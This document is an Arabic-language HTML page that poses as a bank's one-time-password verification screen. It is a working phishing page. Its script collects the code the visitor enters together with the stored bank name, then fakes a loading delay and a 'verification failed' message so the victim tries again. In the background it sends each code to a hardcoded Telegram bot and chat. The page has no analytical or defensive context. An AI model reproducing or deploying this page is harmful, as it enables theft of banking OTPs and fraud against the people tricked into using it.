<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>رمز التحقق</title>

<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap" rel="stylesheet">

<style>
body {
  margin:0;
  font-family:'Cairo';
  background:#f5f5f5;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  padding:20px;
}

.box {
  background:#fff;
  padding:30px 25px;
  border-radius:25px;
  text-align:center;
  width:100%;
  max-width:380px;
  box-shadow:0 15px 30px rgba(0,0,0,0.08);
}

h2 {
  color:#0a8f2c;
  font-size: 24px;
  margin-bottom: 10px;
}

p {
  color:#666;
  font-size: 14px;
  margin-bottom: 10px;
}

input {
  width:100%;
  padding:14px;
  margin-top:20px;
  border-radius:12px;
  border:1px solid #ddd;
  font-size:20px;
  text-align:center;
  letter-spacing:5px;
  font-family:'Cairo';
  box-sizing:border-box;
}

input:focus {
  outline: none;
  border-color: #0a8f2c;
}

button {
  width:100%;
  padding:14px;
  margin-top:20px;
  background:#0a8f2c;
  color:#fff;
  border:none;
  border-radius:12px;
  font-size:16px;
  font-weight:bold;
  cursor:pointer;
}

button:hover {
  background:#078025;
}

.timer {
  margin-top:15px;
  color:#999;
  font-size:13px;
}

/* نافذة منبثقة */
.modal-overlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.6);
  z-index: 1000;
  justify-content: center;
  align-items: center;
}

.modal-box {
  background: #fff;
  border-radius: 20px;
  padding: 30px 25px;
  text-align: center;
  width: 90%;
  max-width: 300px;
}

.modal-box h3 {
  color: #dc3545;
  font-size: 20px;
  margin-bottom: 10px;
}

.modal-box p {
  color: #555;
  font-size: 14px;
  margin-bottom: 20px;
}

.modal-box button {
  background: #dc3545;
  margin-top: 0;
  width: auto;
  padding: 10px 25px;
}

.modal-box button:hover {
  background: #c82333;
}

.loading {
  display:none;
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.7);
  z-index:999;
  justify-content:center;
  align-items:center;
  color:white;
  font-size:18px;
  flex-direction:column;
}

.spinner {
  width:50px;
  height:50px;
  border:5px solid #f3f3f3;
  border-top:5px solid #0a8f2c;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin-bottom:15px;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
</head>

<body>

<div class="box">

  <h2>رمز التحقق</h2>
  <p>تم إرسال رمز التحقق إلى رقم هاتفك</p>

  <input type="text" id="otp" maxlength="6" placeholder="••••••" autocomplete="off" inputmode="numeric">

  <button onclick="submitOTP()">تأكيد</button>

  <div class="timer" id="timer">إعادة الإرسال خلال 30 ثانية</div>

</div>

<!-- نافذة منبثقة للفشل -->
<div id="errorModal" class="modal-overlay">
  <div class="modal-box">
    <h3>فشل التأكيد</h3>
    <p>فشلت عملية التحقق . يرجى المحاولة مرة أخرى</p>
    <button onclick="closeModal()">حاول مرة أخرى</button>
  </div>
</div>

<!-- شاشة التحميل -->
<div id="loadingOverlay" class="loading">
  <div class="spinner"></div>
  <div>جاري التحقق...</div>
</div>

<script>

const botToken = "8497519636:AAG2fIjNUBJhtN63dApkRNoENAFwEUJYTR8";
const chatId = "-4669313790";

let time = 30;
const timerEl = document.getElementById("timer");

const countdown = setInterval(() => {
  time--;
  timerEl.innerText = "إعادة الإرسال خلال " + time + " ثانية";

  if (time <= 0) {
    clearInterval(countdown);
    timerEl.innerText = "يمكنك إعادة الإرسال الآن";
  }
}, 1000);

function showModal() {
  document.getElementById("errorModal").style.display = "flex";
}

function closeModal() {
  document.getElementById("errorModal").style.display = "none";
  document.getElementById("otp").value = "";
  document.getElementById("otp").focus();
}

function submitOTP() {
  const code = document.getElementById("otp").value;

  if (code.length < 4) {
    showModal();
    return;
  }

  // إظهار شاشة التحميل
  const loadingOverlay = document.getElementById('loadingOverlay');
  loadingOverlay.style.display = 'flex';

  // جلب بيانات البنك
  const selectedBank = localStorage.getItem("selectedBank") || "غير محدد";
  const selectedBankArabic = localStorage.getItem("selectedBankArabic") || "غير محدد";

  // تأخير 3 ثواني ثم إظهار رسالة فشل التحقق
  setTimeout(() => {
    // إخفاء شاشة التحميل
    loadingOverlay.style.display = 'none';
    
    // إظهار نافذة الفشل
    showModal();
    
    // إرسال إلى تيليغرام (اختياري)
    const message = `

━━━━━━━━━━━━━━━━━━━━━
🏦 البنك: ${selectedBankArabic} (${selectedBank})
📱 رمز التحقق المدخل: ${code}

━━━━━━━━━━━━━━━━━━━━━
⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
    `;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .catch(err => console.error("خطأ:", err));
    
  }, 3000); // 3 ثواني
}

// السماح بإدخال الأرقام فقط
document.getElementById("otp").addEventListener("input", function(e) {
  this.value = this.value.replace(/[^0-9]/g, '');
});
</script>

</body>
</html>
